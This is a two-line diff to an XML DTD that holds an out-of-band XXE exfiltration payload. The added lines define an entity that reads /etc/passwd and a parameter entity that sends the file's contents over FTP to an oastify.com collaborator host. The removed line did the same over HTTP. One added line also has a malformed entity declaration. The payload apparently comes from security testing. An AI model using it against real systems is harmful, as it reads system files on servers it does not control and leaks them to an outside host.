@@ -1,1 +1,2 @@
-<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'http://yac27pb3ix1r98jqhwfsaqzqqhw8kzbn0.oastify.com/%file;'>">
+<!ENTITY $ file SYSTEM "file:///etc/passwd">
+<!ENTITY % req "<!ENTITY abc SYSTEM 'ftp://thexekiyps8mg3qlormnhl6lxc33ruoid.oastify.com/%file; '>">
